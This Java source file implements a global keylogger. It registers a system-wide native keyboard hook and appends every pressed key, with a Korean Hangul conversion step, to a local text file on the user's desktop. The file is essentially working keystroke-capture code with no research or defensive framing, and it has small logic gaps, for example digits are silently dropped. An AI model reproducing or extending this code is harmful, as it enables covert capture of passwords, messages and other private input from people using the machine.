package main;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener {

	public static void main(String[] args) throws IOException {

		File dir = new File("C:/Users/haga5/Desktop/Main/File");
		File file = new File("C:/Users/haga5/Desktop/Main/File/file.txt");

		if (dir.exists() == false) {
			dir.mkdirs();
		}

		if (file.exists() == false) {
			file.createNewFile();
		}
		NowDay nowday = new NowDay();
		nowday.Nowday();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(new Main());
	}

	int count = 0;

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		Hangel ha = new Hangel();
		String Pressed = NativeKeyEvent.getKeyText(e.getKeyCode());

		if (Pressed.equals("Slash")) {
			Pressed = "/";
		}
		if (Pressed.equals("Enter")) {
			Pressed = "\r\n";
		}

		if (Pressed.equals("Backspace")) {

		}

		if (Pressed.equals("Right") || Pressed.equals("Left") || Pressed.equals("Up") || Pressed.equals("Down")) {
			Pressed = "";
		}

		if (Pressed.equals("Tab")) {
			Pressed += "\r\n";
		}

		String languag = getType(Pressed);

		// 영어일 경우
		if (languag.equals("true")) {
			System.out.println("영어입니다");
			Writer fos = null;
			try {
				fos = new FileWriter("C:/Users/haga5/Desktop/Main/File/file.txt", true);
			} catch (FileNotFoundException e1) {
				e1.printStackTrace();
			} catch (IOException e1) {
				e1.printStackTrace();
			}
			try {
				fos.write(Pressed);
				fos.flush();
				fos.close();
			} catch (Exception e1) {
				e1.printStackTrace();
			}
		}

		// 한글일 경우
		if (languag.equals("false")) {
			System.out.println("한글입니다");
			Writer fos = null;
			try {
				fos = new FileWriter("C:/Users/haga5/Desktop/Main/File/file.txt", true);
			} catch (FileNotFoundException e1) {
				e1.printStackTrace();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			Pressed = ha.ToHangel(Pressed);
			try {
				fos.write(Pressed);
				fos.flush();
				fos.close();
			} catch (Exception e1) {
				e1.printStackTrace();
			}
		}
		// System.out.println("Pressed : " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub

	}

	public static String getType(String word) {
		boolean numeric = false;
		boolean alpha = false;
		boolean korean = false;
		StringBuffer sb = new StringBuffer();

		for (int i = 0; i < word.length(); i++) {
			int index = word.charAt(i);

			if (index >= 48 && index <= 57) {
				numeric = true;
			} else if (index >= 65 && index <= 122) {
				alpha = true;
			} else {
				korean = true;
			}
		}

		if (alpha) {
			sb.append("true");
		}

		if (korean) {
			sb.append("false");
		}

		return sb.toString();
	}

}
